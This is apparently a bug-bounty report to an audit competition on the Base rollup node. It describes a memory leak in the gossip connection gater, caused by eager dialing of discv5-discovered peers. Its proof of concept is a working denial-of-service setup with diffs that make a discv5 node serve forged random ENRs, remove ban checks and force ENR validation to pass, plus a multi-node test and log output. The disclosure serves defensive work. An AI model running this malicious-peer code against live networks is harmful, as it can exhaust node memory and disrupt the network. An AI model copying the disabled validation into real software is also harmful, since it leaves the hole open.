# 76546 bc low memory leak in consensus through malicious discv5 peer recommendations because of eager dialing leading to rollup node crash

**Submitted on May 4th 2026 at 19:52:32 UTC by @Franfran for** [**Audit Comp | Base Azul**](https://immunefi.com/audit-competition/audit-comp-base-azul)

* **Report ID:** #76546
* **Report Type:** Blockchain/DLT
* **Report severity:** Low
* **Target:** <https://github.com/base/base/tree/v0.8.0-rc.28>
* **Impacts:**
  * RPC API crash affecting programs with greater than or equal to 25% of the market capitalization on top of the respective layer

## Description

### Brief/Intro

The rollup node implements the `discv5` protocol and reacts to discovered ENRs. The problem is that the node directly attempts to dial any of these and add it to the connection gater to track the connection state. This opens multiple attack scenarios:

1. Targeted DDOS of victim nodes
2. Memory leak in the connection gater

While (1.) has been partially mitigated by [#2432](https://github.com/base/base/pull/2432) which enforces connection limits at the libp2p layer, the memory leak is still exploitable.

### Vulnerability Details

There is a memory leak in the `connection_gater`. But we can accelerate how fast it's going to grow by creating a bunch of malicious discv5 clients.

When we receive an ENR from the `discv5` library, it's passed to the `enr_sender` channel and then we call the `dial_multiaddr` eagerly without any kind of filtering done first.

At the end of the function, [we call the `connection_gater` with the `dialing` function](https://github.com/base/base/blob/b390d64187772400c51a1d6538c35cf4bc734e23/crates/consensus/gossip/src/driver.rs#L260-L262)

```rust
        // Let the gate know we are dialing the address.
        // Note: libp2p-dns will automatically resolve DNS multiaddrs at the transport layer.
        self.connection_gate.dialing(&addr);
```

And then we call the actual `dial` function from the libp2p swarm:

```rust
        // Dial
        match self.swarm.dial(addr.clone()) {
            Ok(_) => {
                trace!(target: "gossip", peer=?addr, "Dialed peer");
                self.connection_gate.dialed(&addr);
                Metrics::dial_peer().increment(1.0);
            }
            Err(e) => {
                error!(target: "gossip", error = ?e, "Failed to connect to peer");
                self.connection_gate.remove_dial(&peer_id);
                Metrics::dial_peer_error("connection_error").increment(1.0);
            }
        }
```

The problem is that the [`dialing` function](https://github.com/base/base/blob/812a727f2e005b2897d885338f1c6089b9adb8a8/crates/consensus/gossip/src/gater.rs#L290) adds a new entry to the `self.current_dials` as well as the `self.connectedness`, while [`remove_dial`](https://github.com/base/base/blob/812a727f2e005b2897d885338f1c6089b9adb8a8/crates/consensus/gossip/src/gater.rs#L315) (which is called in case of libp2p `dial` function error) only clears the entry in the `current_dials` function.

But there is even worse. If the dial returned an `Ok(..)`, we call [`dialed`](https://github.com/base/base/blob/812a727f2e005b2897d885338f1c6089b9adb8a8/crates/consensus/gossip/src/gater.rs#L299) which doesn't edit the `connectedness` or `current_dials`, but it adds a new entry to the `self.dialed_peers`!

While having a quick look at the libp2p `dial` function, it seems like dial errors are only (roughly) returned when the connection limits are hit. The memory leak is attained more easily when the `dial` returns an `Ok(..)` but it can still be triggered if the function returns an error.

### Impact Details

Base nodes are all dependent on the rollup node, which depends on the network actor, which is the component that features this discovery protocol `discv5`.

Attackers can spin up many instances of malicious discovery nodes which will pollute the storage of honest nodes, and make them crash in the long run since they may go out of memory, which is going to introduce a lot of instability on the network, and create DOS (Denial of Service) attacks which is a liveness threat to the network.

## Proof of Concept

This proof of concept shows that the attack vector is real, but has not really been optimized to make it blow up fast because of time constraint (this is the last hour before the contest ends). Further analysis of the `discv5` library and of the integration test could certainly find some ways for malicious peers to send ENRs at a higher throughput.

Changes has to be done to the `discv5` libraries in order for this to work, but some explanations regarding the attack have been given. It's still exploitable but just makes the attack easier to reproduce in a test env.

Here are the few things which have been done:

### 1. Modification of the discv5 library

Basically, return many garbage node when receiving the `FIND_NODE` request:

```diff
diff --git a/src/service.rs b/src/service.rs  
index 9437269..dd7b174 100644  
--- a/src/service.rs  
+++ b/src/service.rs  
@@ -35,12 +35,17 @@ use connectivity_state::{  
     ConnectivityState, TimerFailure, DURATION_UNTIL_NEXT_CONNECTIVITY_ATTEMPT,  
 };  
 use delay_map::HashSetDelay;  
-use enr::{CombinedKey, NodeId};  
+use enr::k256::elliptic_curve::bigint::CheckedMul;  
+use enr::k256::U256;  
+use enr::{CombinedKey, EnrKey, NodeId};  
 use fnv::FnvHashMap;  
 use futures::prelude::*;  
 use more_asserts::debug_unreachable;  
 use parking_lot::RwLock;  
 use rpc::*;  
+use std::io::Read;  
+use std::net::Ipv4Addr;  
+use std::ops::Mul;  
 use std::{  
     collections::HashMap,  
     convert::TryInto,  
@@ -170,6 +175,7 @@ pub enum ServiceRequest {  
 }  
   
 use crate::discv5::PERMIT_BAN_LIST;  
+use crate::kbucket::EntryRefView;  
   
 pub struct Service {  
     /// Configuration parameters.  
@@ -760,22 +766,26 @@ impl Service {  
                         nodes.retain(|enr| peer_key.log2_distance(&enr.node_id().into()).is_none());  
                     }  
                 } else {  
-                    let before_len = nodes.len();  
-                    nodes.retain(|enr| {  
-                        peer_key  
-                            .log2_distance(&enr.node_id().into())  
-                            .map(|distance| distances_requested.contains(&distance))  
-                            .unwrap_or_else(|| false)  
-                    });  
-  
-                    if nodes.len() < before_len {  
-                        // Peer sent invalid ENRs. Blacklist the Node  
-                        let node_id = active_request.contact.node_id();  
-                        let addr = active_request.contact.socket_addr();  
-                        warn!(%node_id, %addr, "ENRs received of unsolicited distances. Blacklisting");  
-                        let ban_timeout = self.config.ban_duration.map(|v| Instant::now() + v);  
-                        PERMIT_BAN_LIST.write().ban(node_address, ban_timeout);  
-                    }  
+                    // NOTE: commenting this out allows us for the node recommendation in the attack to be buggy.  
+                    // We need to mine ENRs in order for them to match the log2 distance as defined by the protocol.  
+                    // But for some reason that doesn't invalidate the claim, the random_nodes_by_distances fn is wrong!  
+  
+                    // let before_len = nodes.len();  
+                    // nodes.retain(|enr| {  
+                    //     peer_key  
+                    //         .log2_distance(&enr.node_id().into())  
+                    //         .map(|distance| distances_requested.contains(&distance))  
+                    //         .unwrap_or_else(|| false)  
+                    // });  
+  
+                    // if nodes.len() < before_len {  
+                    //     // Peer sent invalid ENRs. Blacklist the Node  
+                    //     let node_id = active_request.contact.node_id();  
+                    //     let addr = active_request.contact.socket_addr();  
+                    //     warn!(%node_id, %addr, "ENRs received of unsolicited distances. Blacklisting");  
+                    //     let ban_timeout = self.config.ban_duration.map(|v| Instant::now() + v);  
+                    //     PERMIT_BAN_LIST.write().ban(node_address, ban_timeout);  
+                    // }  
                 }  
   
                 // handle the case that there is more than one response  
@@ -1061,6 +1071,81 @@ impl Service {  
         self.send_rpc_request(active_request);  
     }  
   
+    pub fn random_nodes_by_distances(  
+        &self,  
+        from: &NodeId,  
+        log2_distances: &[u64],  
+        max_nodes: usize,  
+    ) -> Vec<Enr> {  
+        rand::thread_rng();  
+        let mut result = Vec::new();  
+  
+        let from: [u8; 32] = from.raw().as_array().unwrap().clone();  
+  
+        for &distance in log2_distances {  
+            if result.len() >= max_nodes {  
+                break;  
+            }  
+  
+            if distance == 0 || distance > 256 {  
+                continue;  
+            }  
+  
+            loop {  
+                // Generate random key  
+                let key = CombinedKey::generate_secp256k1();  
+  
+                // Real node id derived from pubkey  
+                let node_id = NodeId::from(key.public());  
+  
+                let node_bytes: [u8; 32] = node_id.raw().as_array().unwrap().clone();  
+  
+                // Compute XOR distance  
+                let mut xor = [0u8; 32];  
+                for i in 0..32 {  
+                    xor[i] = from[i] ^ node_bytes[i];  
+                }  
+  
+                // Compute log2 distance  
+                let mut found_distance = None;  
+  
+                for i in 0..256 {  
+                    let b = xor[i / 8];  
+                    let bit = (b >> (7 - (i % 8))) & 1;  
+  
+                    if bit == 1 {  
+                        found_distance = Some((256 - i) as u64);  
+                        break;  
+                    }  
+                }  
+  
+                if found_distance != Some(distance) {  
+                    continue;  
+                }  
+  
+                // Build ENR  
+                let port: u16 = rand::random();  
+  
+                let mut b = Enr::builder();  
+                b.ip4(Ipv4Addr::new(  
+                    rand::random(),  
+                    rand::random(),  
+                    rand::random(),  
+                    rand::random(),  
+                ))  
+                .udp4(port)  
+                .tcp4(port);  
+  
+                let mut enr = b.build(&key).unwrap();  
+  
+                result.push(enr);  
+                break;  
+            }  
+        }  
+  
+        result  
+    }  
+  
     /// Sends a NODES response, given a list of found ENR's. This function splits the nodes up  
     /// into multiple responses to ensure the response stays below the maximum packet size.  
     fn send_nodes_response(  
@@ -1080,22 +1165,11 @@ impl Service {  
             distances.remove(0);  
         }  
   
-        if !distances.is_empty() {  
-            let mut kbuckets = self.kbuckets.write();  
-            for node in kbuckets  
-                .nodes_by_distances(distances.as_slice(), self.config.max_nodes_response)  
-                .into_iter()  
-                .filter_map(|entry| {  
-                    if entry.node.key.preimage() != &node_address.node_id {  
-                        Some(entry.node.value.clone())  
-                    } else {  
-                        None  
-                    }  
-                })  
-            {  
-                nodes_to_send.push(node);  
-            }  
-        }  
+        let nodes_to_send = self.random_nodes_by_distances(  
+            &node_address.node_id,  
+            distances.as_slice(),  
+            self.config.max_nodes_response,  
+        );  
   
         // if there are no nodes, send an empty response  
         if nodes_to_send.is_empty() {
```

Then, you will have to modify the way it's imported in `Cargo.toml`. For instance you can import it by path.

### 2. Logging to make the memory leak easier to spot

```diff
diff --git a/crates/consensus/gossip/src/gater.rs b/crates/consensus/gossip/src/gater.rs
index 8bc18cdca..9262ab018 100644
--- a/crates/consensus/gossip/src/gater.rs
+++ b/crates/consensus/gossip/src/gater.rs
@@ -291,6 +291,7 @@ impl ConnectionGate for ConnectionGater {
         if let Some(peer_id) = Self::peer_id_from_addr(addr) {
             self.current_dials.insert(peer_id);
             self.connectedness.insert(peer_id, Connectedness::Connected);
+            warn!("connectedness len {}", self.connectedness.len());
         } else {
             warn!(target: "p2p", peer=?addr, "Failed to extract PeerId from Multiaddr when dialing");
         }
@@ -310,6 +311,7 @@ impl ConnectionGate for ConnectionGater {
         dial_info.num_dials += 1;
         dial_info.last_dial = Instant::now();
         trace!(target: "gossip", peer=?addr, count = dial_info.num_dials, "Dialed peer");
+        warn!("dialed_peers len {}", self.dialed_peers.len());
     }
   
     fn remove_dial(&mut self, peer_id: &PeerId) {
```

### 3. Integration test

Spinning a bunch of consensus nodes to observe the memory leak

```diff
diff --git a/crates/consensus/service/tests/actors/network/p2p.rs b/crates/consensus/service/tests/actors/network/p2p.rs
index 4fbe8ff00..b94664f53 100644
--- a/crates/consensus/service/tests/actors/network/p2p.rs
+++ b/crates/consensus/service/tests/actors/network/p2p.rs
@@ -1,4 +1,6 @@
 use crate::actors::network::mocks::builder::TestNetworkBuilder;
+use std::time::Duration;
+use tokio::time::sleep;
  
 #[tokio::test(flavor = "multi_thread")]
 async fn test_p2p_network_conn() -> anyhow::Result<()> {
@@ -42,3 +44,39 @@ async fn test_large_network_conn() -> anyhow::Result<()> {
  
     Ok(())
 }
+  
+#[tokio::test(flavor = "multi_thread")]
+async fn test_malicious_discv5_peer_connection_gate_memory_leak() -> anyhow::Result<()> {
+    use tracing_subscriber::EnvFilter;
+
+    let _ = tracing_subscriber::fmt()
+        .with_env_filter(EnvFilter::new("info,libp2p=info"))
+        .with_test_writer()
+        .try_init();
+
+    const NODES: usize = 100;
+
+    let mut builder = TestNetworkBuilder::new();
+    let (mut networks, mut bootnodes) = (vec![], vec![]);
+    for _ in 0..NODES {
+        let network = builder.build(bootnodes.clone()).await;
+        let enr = network.peer_enr().await?;
+        networks.push(network);
+        bootnodes.push(enr);
+    }
+
+    tracing::info!("Waiting for connections...");
+    for n in &networks {
+        for o in &networks {
+            if n.peer_id().await? == o.peer_id().await? {
+                continue;
+            }
+            let _ = n.is_connected_to_with_retries(o).await;
+        }
+    }
+    tracing::info!("Connections established");
+
+    sleep(Duration::from_mins(20)).await;
+
+    Ok(())
+}
```

Change the `TestNetworkBuilder` implementation to create real-life-like discovery networks with ports and stuff:

```diff
diff --git a/crates/consensus/service/tests/actors/network/mocks/builder.rs b/crates/consensus/service/tests/actors/network/mocks/builder.rs
index 54fae0443..350de9524 100644
--- a/crates/consensus/service/tests/actors/network/mocks/builder.rs
+++ b/crates/consensus/service/tests/actors/network/mocks/builder.rs
@@ -14,7 +14,7 @@ use base_consensus_peers::BootNode;
 use base_consensus_sources::BlockSigner;
 use discv5::{ConfigBuilder, Enr, ListenConfig};
 use libp2p::{Multiaddr, identity::Keypair, multiaddr::Protocol};
-use rand::RngCore;
+use rand::{Rng, RngCore};
 use tokio::sync::mpsc;
 use tokio_util::sync::CancellationToken;
 use tracing::error;
@@ -60,6 +60,10 @@ impl TestNetworkBuilder {
     /// Minimal network configuration.
     /// Only allows loopback addresses in the discovery table.
     pub(crate) async fn build(&mut self, bootnodes: Vec<Enr>) -> TestNetwork {
+        let discovery_port = rand::rng().random_range(10000..u16::MAX);
+        let gossip_port = rand::rng().random_range(10000..u16::MAX);
+        assert_ne!(discovery_port, gossip_port, "Gossip port must be different from node port");
+
         let keypair = self.custom_keypair.take().unwrap_or_else(Keypair::generate_secp256k1);
  
         let secp256k1_key = keypair.clone().try_into_secp256k1()
@@ -70,19 +74,19 @@ impl TestNetworkBuilder {
  
         let node_addr = IpAddr::V4(Ipv4Addr::UNSPECIFIED);
  
-        let discovery_config = ConfigBuilder::new(ListenConfig::from_ip(node_addr, 0))
+        let discovery_config = ConfigBuilder::new(ListenConfig::from_ip(node_addr, discovery_port))
             // Only allow loopback addresses.
-            .table_filter(|enr| {
-                let Some(ip) = enr.ip4() else {
-                    return false;
-                };
-  
-                ip.is_loopback()
-            })
+            // .table_filter(|enr| {
+            //     let Some(ip) = enr.ip4() else {
+            //         return false;
+            //     };
+            //
+            //     ip.is_loopback()
+            // })
             .build();
  
         let mut gossip_multiaddr = Multiaddr::from(node_addr);
-        gossip_multiaddr.push(Protocol::Tcp(0));
+        gossip_multiaddr.push(Protocol::Tcp(gossip_port));
  
         // Create a new network actor. No external connections
         let builder = NetworkBuilder::new(
@@ -91,7 +95,7 @@ impl TestNetworkBuilder {
             self.unsafe_block_signer,
             gossip_multiaddr,
             keypair,
-            LocalNode::new(local_node_key.clone(), node_addr, 0, 0),
+            LocalNode::new(local_node_key.clone(), node_addr, discovery_port, discovery_port),
             discovery_config,
             Some(BlockSigner::Local(local_node_key.into())),
         )
```

Allow ENR validation to always pass. It's easy to "exploit" but would be pretty verbose to do in the `discv5` library, where the malicious ENRs are built.

```diff
diff --git a/crates/consensus/peers/src/enr.rs b/crates/consensus/peers/src/enr.rs
index 98562f0f6..7bfa45f7a 100644
--- a/crates/consensus/peers/src/enr.rs
+++ b/crates/consensus/peers/src/enr.rs
@@ -22,6 +22,8 @@ pub enum EnrValidation {
 impl EnrValidation {
     /// Validates the [`Enr`] for Base.
     pub fn validate(enr: &Enr, chain_id: u64) -> Self {
+        return Self::Valid;
+          
         let base_enr = match BaseEnr::try_from(enr) {
             Ok(base_enr) => base_enr,
             Err(e) => return Self::ConversionError(e),
```

***

<details>

<summary>Run the test output</summary>

You will see the connection gater grow. After only \~15 minutes of running, we already have more than **4k** entries:

```sh
2026-05-04T19:46:17.099088Z  WARN base_consensus_gossip::gater: dialed_peers len 4358
2026-05-04T19:46:17.099103Z  WARN base_consensus_gossip::gater: connectedness len 4359
2026-05-04T19:46:17.099106Z  WARN base_consensus_gossip::gater: dialed_peers len 4359
2026-05-04T19:46:17.099690Z  WARN base_consensus_gossip::gater: connectedness len 4360
2026-05-04T19:46:17.099714Z  WARN base_consensus_gossip::gater: dialed_peers len 4360
2026-05-04T19:46:17.099755Z  WARN base_consensus_gossip::gater: connectedness len 4361
2026-05-04T19:46:17.099764Z  WARN base_consensus_gossip::gater: dialed_peers len 4361
2026-05-04T19:46:17.099803Z  WARN base_consensus_gossip::gater: connectedness len 4362
2026-05-04T19:46:17.099813Z  WARN base_consensus_gossip::gater: dialed_peers len 4362
2026-05-04T19:46:17.100521Z  WARN base_consensus_gossip::gater: connectedness len 4363
2026-05-04T19:46:17.100527Z  WARN base_consensus_gossip::gater: dialed_peers len 4363
2026-05-04T19:46:17.100549Z  WARN base_consensus_gossip::gater: connectedness len 4364
2026-05-04T19:46:17.100555Z  WARN base_consensus_gossip::gater: dialed_peers len 4364
2026-05-04T19:46:17.100570Z  WARN base_consensus_gossip::gater: connectedness len 4365
2026-05-04T19:46:17.100575Z  WARN base_consensus_gossip::gater: dialed_peers len 4365
2026-05-04T19:46:17.116533Z  WARN base_consensus_gossip::gater: connectedness len 4394
2026-05-04T19:46:17.116547Z  WARN base_consensus_gossip::gater: dialed_peers len 4394
2026-05-04T19:46:17.116600Z  WARN base_consensus_gossip::gater: connectedness len 4395
2026-05-04T19:46:17.116610Z  WARN base_consensus_gossip::gater: dialed_peers len 4395
2026-05-04T19:46:17.116648Z  WARN base_consensus_gossip::gater: connectedness len 4396
2026-05-04T19:46:17.116656Z  WARN base_consensus_gossip::gater: dialed_peers len 4396
2026-05-04T19:46:17.120431Z  WARN base_consensus_gossip::gater: connectedness len 4423
2026-05-04T19:46:17.120441Z  WARN base_consensus_gossip::gater: dialed_peers len 4423
2026-05-04T19:46:17.120457Z  WARN base_consensus_gossip::gater: connectedness len 4424
2026-05-04T19:46:17.120463Z  WARN base_consensus_gossip::gater: dialed_peers len 4424
2026-05-04T19:46:17.120477Z  WARN base_consensus_gossip::gater: connectedness len 4425
2026-05-04T19:46:17.120484Z  WARN base_consensus_gossip::gater: dialed_peers len 4425
2026-05-04T19:46:17.122213Z  WARN base_consensus_gossip::gater: connectedness len 4366
2026-05-04T19:46:17.122219Z  WARN base_consensus_gossip::gater: dialed_peers len 4366
2026-05-04T19:46:17.122281Z  WARN base_consensus_gossip::gater: connectedness len 4367
2026-05-04T19:46:17.122302Z  WARN base_consensus_gossip::gater: dialed_peers len 4367
2026-05-04T19:46:17.122339Z  WARN base_consensus_gossip::gater: connectedness len 4368
2026-05-04T19:46:17.122348Z  WARN base_consensus_gossip::gater: dialed_peers len 4368
2026-05-04T19:46:17.261592Z  WARN base_consensus_gossip::gater: connectedness len 4290
2026-05-04T19:46:17.261620Z  WARN base_consensus_gossip::gater: dialed_peers len 4290
2026-05-04T19:46:17.261653Z  WARN base_consensus_gossip::gater: connectedness len 4291
2026-05-04T19:46:17.261662Z  WARN base_consensus_gossip::gater: dialed_peers len 4291
2026-05-04T19:46:17.261721Z  WARN base_consensus_gossip::gater: connectedness len 4292
2026-05-04T19:46:17.261728Z  WARN base_consensus_gossip::gater: dialed_peers len 4292
2026-05-04T19:46:17.264134Z  WARN base_consensus_gossip::gater: connectedness len 4237
2026-05-04T19:46:17.264146Z  WARN base_consensus_gossip::gater: dialed_peers len 4237
2026-05-04T19:46:17.264177Z  WARN base_consensus_gossip::gater: connectedness len 4238
2026-05-04T19:46:17.264184Z  WARN base_consensus_gossip::gater: dialed_peers len 4238
2026-05-04T19:46:17.264215Z  WARN base_consensus_gossip::gater: connectedness len 4239
2026-05-04T19:46:17.264224Z  WARN base_consensus_gossip::gater: dialed_peers len 4239
2026-05-04T19:46:17.264986Z  WARN base_consensus_gossip::gater: connectedness len 4409
2026-05-04T19:46:17.265004Z  WARN base_consensus_gossip::gater: dialed_peers len 4409
2026-05-04T19:46:17.265051Z  WARN base_consensus_gossip::gater: connectedness len 4410
2026-05-04T19:46:17.265060Z  WARN base_consensus_gossip::gater: dialed_peers len 4410
2026-05-04T19:46:17.265298Z  WARN base_consensus_gossip::gater: connectedness len 4326
2026-05-04T19:46:17.265312Z  WARN base_consensus_gossip::gater: dialed_peers len 4326
2026-05-04T19:46:17.265346Z  WARN base_consensus_gossip::gater: connectedness len 4327
2026-05-04T19:46:17.265353Z  WARN base_consensus_gossip::gater: dialed_peers len 4327
2026-05-04T19:46:17.265386Z  WARN base_consensus_gossip::gater: connectedness len 4328
2026-05-04T19:46:17.265393Z  WARN base_consensus_gossip::gater: dialed_peers len 4328
2026-05-04T19:46:17.265930Z  WARN base_consensus_gossip::gater: connectedness len 4473
2026-05-04T19:46:17.265948Z  WARN base_consensus_gossip::gater: dialed_peers len 4473
2026-05-04T19:46:17.265984Z  WARN base_consensus_gossip::gater: connectedness len 4474
2026-05-04T19:46:17.265990Z  WARN base_consensus_gossip::gater: dialed_peers len 4474
2026-05-04T19:46:17.275200Z  WARN base_consensus_gossip::gater: connectedness len 4328
2026-05-04T19:46:17.275217Z  WARN base_consensus_gossip::gater: dialed_peers len 4328
2026-05-04T19:46:17.275263Z  WARN base_consensus_gossip::gater: connectedness len 4329
2026-05-04T19:46:17.275272Z  WARN base_consensus_gossip::gater: dialed_peers len 4329
2026-05-04T19:46:17.275305Z  WARN base_consensus_gossip::gater: connectedness len 4330
2026-05-04T19:46:17.275313Z  WARN base_consensus_gossip::gater: dialed_peers len 4330
2026-05-04T19:46:17.275683Z  WARN base_consensus_gossip::gater: connectedness len 4256
2026-05-04T19:46:17.275696Z  WARN base_consensus_gossip::gater: dialed_peers len 4256
2026-05-04T19:46:17.275729Z  WARN base_consensus_gossip::gater: connectedness len 4257
2026-05-04T19:46:17.275737Z  WARN base_consensus_gossip::gater: dialed_peers len 4257
2026-05-04T19:46:17.275779Z  WARN base_consensus_gossip::gater: connectedness len 4258
2026-05-04T19:46:17.275787Z  WARN base_consensus_gossip::gater: dialed_peers len 4258
2026-05-04T19:46:17.276019Z  WARN base_consensus_gossip::gater: connectedness len 4476
2026-05-04T19:46:17.276036Z  WARN base_consensus_gossip::gater: dialed_peers len 4476
2026-05-04T19:46:17.276076Z  WARN base_consensus_gossip::gater: connectedness len 4477
2026-05-04T19:46:17.276085Z  WARN base_consensus_gossip::gater: dialed_peers len 4477
2026-05-04T19:46:17.276117Z  WARN base_consensus_gossip::gater: connectedness len 4478
2026-05-04T19:46:17.276125Z  WARN base_consensus_gossip::gater: dialed_peers len 4478
2026-05-04T19:46:17.410127Z  WARN base_consensus_gossip::gater: connectedness len 4620
2026-05-04T19:46:17.410142Z  WARN base_consensus_gossip::gater: dialed_peers len 4620
2026-05-04T19:46:17.410210Z  WARN base_consensus_gossip::gater: connectedness len 4621
2026-05-04T19:46:17.410219Z  WARN base_consensus_gossip::gater: dialed_peers len 4621
2026-05-04T19:46:17.410250Z  WARN base_consensus_gossip::gater: connectedness len 4622
2026-05-04T19:46:17.410255Z  WARN base_consensus_gossip::gater: dialed_peers len 4622
2026-05-04T19:46:17.419154Z  WARN base_consensus_gossip::gater: connectedness len 4623
2026-05-04T19:46:17.419172Z  WARN base_consensus_gossip::gater: dialed_peers len 4623
2026-05-04T19:46:17.419236Z  WARN base_consensus_gossip::gater: connectedness len 4624
2026-05-04T19:46:17.419254Z  WARN base_consensus_gossip::gater: dialed_peers len 4624
2026-05-04T19:46:17.419285Z  WARN base_consensus_gossip::gater: connectedness len 4625
2026-05-04T19:46:17.419291Z  WARN base_consensus_gossip::gater: dialed_peers len 4625
2026-05-04T19:46:17.420788Z  WARN base_consensus_gossip::gater: connectedness len 4626
2026-05-04T19:46:17.420797Z  WARN base_consensus_gossip::gater: dialed_peers len 4626
2026-05-04T19:46:17.420848Z  WARN base_consensus_gossip::gater: connectedness len 4627
2026-05-04T19:46:17.420868Z  WARN base_consensus_gossip::gater: dialed_peers len 4627
2026-05-04T19:46:17.420901Z  WARN base_consensus_gossip::gater: connectedness len 4628
2026-05-04T19:46:17.420908Z  WARN base_consensus_gossip::gater: dialed_peers len 4628
2026-05-04T19:46:17.421847Z  WARN base_consensus_gossip::gater: connectedness len 4629
2026-05-04T19:46:17.421857Z  WARN base_consensus_gossip::gater: dialed_peers len 4629
2026-05-04T19:46:17.421870Z  WARN base_consensus_gossip::gater: connectedness len 4630
2026-05-04T19:46:17.421874Z  WARN base_consensus_gossip::gater: dialed_peers len 4630
2026-05-04T19:46:17.422093Z  WARN base_consensus_gossip::gater: connectedness len 4631
2026-05-04T19:46:17.422117Z  WARN base_consensus_gossip::gater: dialed_peers len 4631
2026-05-04T19:46:17.422159Z  WARN base_consensus_gossip::gater: connectedness len 4632
2026-05-04T19:46:17.422166Z  WARN base_consensus_gossip::gater: dialed_peers len 4632
2026-05-04T19:46:17.423261Z  WARN base_consensus_gossip::gater: connectedness len 4633
2026-05-04T19:46:17.423272Z  WARN base_consensus_gossip::gater: dialed_peers len 4633
2026-05-04T19:46:17.423305Z  WARN base_consensus_gossip::gater: connectedness len 4634
2026-05-04T19:46:17.423314Z  WARN base_consensus_gossip::gater: dialed_peers len 4634
2026-05-04T19:46:17.429384Z  WARN base_consensus_gossip::gater: connectedness len 4635
2026-05-04T19:46:17.429396Z  WARN base_consensus_gossip::gater: dialed_peers len 4635
2026-05-04T19:46:17.429430Z  WARN base_consensus_gossip::gater: connectedness len 4636
2026-05-04T19:46:17.429439Z  WARN base_consensus_gossip::gater: dialed_peers len 4636
2026-05-04T19:46:17.444651Z  WARN base_consensus_gossip::gater: connectedness len 4499
2026-05-04T19:46:17.444671Z  WARN base_consensus_gossip::gater: dialed_peers len 4499
2026-05-04T19:46:17.444698Z  WARN base_consensus_gossip::gater: connectedness len 4500
2026-05-04T19:46:17.444704Z  WARN base_consensus_gossip::gater: dialed_peers len 4500
2026-05-04T19:46:17.444742Z  WARN base_consensus_gossip::gater: connectedness len 4501
2026-05-04T19:46:17.444747Z  WARN base_consensus_gossip::gater: dialed_peers len 4501
2026-05-04T19:46:17.447183Z  WARN base_consensus_gossip::gater: connectedness len 4637
2026-05-04T19:46:17.447193Z  WARN base_consensus_gossip::gater: dialed_peers len 4637
2026-05-04T19:46:17.447205Z  WARN base_consensus_gossip::gater: connectedness len 4638
2026-05-04T19:46:17.447210Z  WARN base_consensus_gossip::gater: dialed_peers len 4638
2026-05-04T19:46:17.823591Z  WARN base_consensus_gossip::gater: connectedness len 4251
2026-05-04T19:46:17.823609Z  WARN base_consensus_gossip::gater: dialed_peers len 4251
2026-05-04T19:46:17.823621Z  WARN base_consensus_gossip::gater: connectedness len 4252
2026-05-04T19:46:17.823626Z  WARN base_consensus_gossip::gater: dialed_peers len 4252
2026-05-04T19:46:17.827292Z  WARN base_consensus_gossip::gater: connectedness len 4414
2026-05-04T19:46:17.827306Z  WARN base_consensus_gossip::gater: dialed_peers len 4414
2026-05-04T19:46:17.827319Z  WARN base_consensus_gossip::gater: connectedness len 4415
2026-05-04T19:46:17.827325Z  WARN base_consensus_gossip::gater: dialed_peers len 4415
2026-05-04T19:46:17.831362Z  WARN base_consensus_gossip::gater: connectedness len 4416
2026-05-04T19:46:17.831375Z  WARN base_consensus_gossip::gater: dialed_peers len 4416
2026-05-04T19:46:17.831387Z  WARN base_consensus_gossip::gater: connectedness len 4417
2026-05-04T19:46:17.831391Z  WARN base_consensus_gossip::gater: dialed_peers len 4417
2026-05-04T19:46:17.831404Z  WARN base_consensus_gossip::gater: connectedness len 4418
2026-05-04T19:46:17.831409Z  WARN base_consensus_gossip::gater: dialed_peers len 4418
2026-05-04T19:46:17.861808Z  WARN base_consensus_gossip::gater: connectedness len 4419
2026-05-04T19:46:17.861818Z  WARN base_consensus_gossip::gater: dialed_peers len 4419
2026-05-04T19:46:17.861830Z  WARN base_consensus_gossip::gater: connectedness len 4420
2026-05-04T19:46:17.861835Z  WARN base_consensus_gossip::gater: dialed_peers len 4420
2026-05-04T19:46:17.861845Z  WARN base_consensus_gossip::gater: connectedness len 4421
2026-05-04T19:46:17.861847Z  WARN base_consensus_gossip::gater: dialed_peers len 4421
```

</details>
